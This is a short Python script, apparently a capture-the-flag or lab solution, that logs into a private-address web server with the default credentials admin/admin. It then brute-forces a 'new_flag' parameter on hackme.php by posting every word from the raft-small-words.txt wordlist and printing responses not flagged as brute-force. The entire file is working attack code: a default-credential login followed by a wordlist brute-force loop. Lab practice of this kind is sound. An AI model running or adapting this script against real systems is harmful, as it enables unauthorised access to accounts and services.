# flagU.py

# Import
import requests

lines = []

with open("raft-small-words.txt",'r') as raft:
    lines = raft.readlines()

s = requests.Session()

loginUrl = 'http://172.25.0.31/index.php'

credentials = {
    'username': 'admin',
    'password': 'admin'
}

loginResponse = s.post(loginUrl, data=credentials)

if 'You are not logged in' not in loginResponse.text:
    print('Login successful')

    response = s.post('http://172.25.0.31/check.php', data=credentials)
    """
    # might be needed later
    response1 = s.post('http://172.25.0.31/hackme.php')
    print("\n" + response1.text)
    """

    # Loop
    for i in lines:
        # Set our post parameter of flag_value to the current word using raft-small-words.txt
        myData = {'new_flag': i.replace("\n", "")}
        response2 = s.post('http://172.25.0.31/hackme.php', data=myData)
        currentPageText = response2.text

        # Check
        if "brute-force" not in currentPageText:
            print(response2.text)

else:
    print('Login failed')